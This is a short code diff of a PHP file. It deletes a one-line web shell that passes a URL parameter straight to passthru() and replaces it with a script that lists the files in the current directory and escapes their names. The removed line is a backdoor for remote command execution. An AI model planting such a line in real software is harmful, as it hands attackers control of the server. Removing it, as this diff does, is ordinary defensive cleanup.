@@ -1,3 +1,27 @@
 <?php
-passthru ($ _ GET [cmd]);
+// Directory to list files from - use a specific directory path
+$directory = '.';
+
+// Check if directory exists
+if (is_dir($directory)) {
+    // Open directory handle
+    if ($dh = opendir($directory)) {
+        echo "Files in directory '$directory':<br>";
+        
+        // Loop through directory entries
+        while (($file = readdir($dh)) !== false) {
+            // Skip current and parent directory links
+            if ($file != '.' && $file != '..') {
+                echo htmlspecialchars($file) . "<br>";
+            }
+        }
+        
+        // Close directory handle
+        closedir($dh);
+    } else {
+        echo "Unable to open directory.";
+    }
+} else {
+    echo "Directory does not exist.";
+}
 ?>
